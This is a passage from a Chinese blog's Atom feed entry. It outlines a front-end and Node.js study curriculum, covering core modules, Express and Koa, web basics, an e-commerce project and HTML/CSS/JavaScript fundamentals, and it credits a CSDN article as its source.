X环境配置、REPL环境和控制台程序、异步编程，非阻塞I/O、模块概念，模块管理工具、开发流程，调试，测试。</li><li>核心模块和对象：<br>全局对象global，process，console，util、事件驱动，事件发射器、加密解密，路径操作，序列化和反序列化、文件流操作、HTTP服务端与客户端、Socket.IO。</li><li>Web开发基础：<br>HTTP协议，请求响应处理过程、关系型数据库操作和数据访问、非关系型数据库操作和数据访问、原生的Node.js开发Web应用程序、Web开发工作流、Node.js开发Blog案例。</li><li>快速开发框架：<br>Express简介+MVC简介、Express常用API、Express路由模块、Jade/Ejs模板引擎、使用Express重构Blog案例、Koa等其他常见MVC框架。</li><li>Node.js开发电子商务实战：<br>需求与设计、账户模块注册登录、会员中心模块、前台展示模块、购物车，订单结算、在线客服即时通讯模块。</li></ul><p>转自:<a href="https://blog.csdn.net/u011047006/article/details/52597178" target="_blank" rel="noopener">https://blog.csdn.net/u011047006/article/details/52597178</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;第一阶段：&quot;&gt;&lt;a href=&quot;#第一阶段：&quot; class=&quot;headerlink&quot; title=&quot;第一阶段：&quot;&gt;&lt;/a&gt;第一阶段：&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;HTML+CSS：&lt;br&gt;HTML进阶、CSS进阶、div+css布局、HTML+css整站开发。&lt;/li&gt;
&lt;li&gt;JavaScript基础：&lt;br&gt;Js基础教程、js内置对象常用方法、常见DOM树操作大全、ECMAscript、DOM、BOM、定时器和焦点图。&lt;/li&gt;
&lt;li&gt;JS基本特效：&lt;br&gt;常见特效、例如：tab、导航、整页滚动、轮播图、JS制作幻灯片、弹出层、手风琴菜单、瀑布流布局、滚动事件、滚差视图。
    
    </summary>
    
      <category term="前端" scheme="http://dangoying.ink/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="前端" scheme="http://dangoying.ink/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
</feed>
